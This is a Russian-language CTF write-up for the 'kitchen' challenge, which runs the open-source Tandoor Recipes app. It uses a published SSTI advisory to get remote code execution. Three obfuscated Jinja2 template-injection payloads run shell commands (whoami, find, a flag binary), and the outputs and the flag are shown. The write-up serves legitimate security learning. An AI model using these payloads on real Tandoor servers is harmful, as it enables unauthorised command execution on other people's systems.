# kitchen

Заходим на сайт. Видим довольно большое по размеру приложение. вряд ли  оно было написано специально для ctf. Гуглим название, находим проект на гитхаб и видим 3 уязвимости во вкладке security

[Stored XSS through Unrestricted File Upload](https://github.com/TandoorRecipes/recipes/security/advisories/GHSA-56jp-j3x5-hh2w) by vabene1111 High

[Local file disclosure - Users can read the content of any file on the server](https://github.com/TandoorRecipes/recipes/security/advisories/GHSA-jrgj-35jx-2qq7) by vabene1111 High

[SSTI - Remote Code Execution](https://github.com/TandoorRecipes/recipes/security/advisories/GHSA-r6rj-h75w-vj8v) by vabene1111 Critical

Пробуем третий экслойт, он работает.
```
{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(418)('whoami',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('decode')('utf-8')}}

```
```
nobody
```
---
Ищем наш исполняемый файл.
```
{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(418)('find / -name print_flag',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('decode')('utf-8')}}

```
```
/opt/ctf/secret/print_flag
```
Выполняем.
```
{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(418)('/opt/ctf/secret/print_flag',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('decode')('utf-8')}}

```
```
MSKCTF{d97e0da93b8a4ed13e81c0936e7a453dec63370e} 
```

---
# Flag: MSKCTF{d97e0da93b8a4ed13e81c0936e7a453dec63370e} 

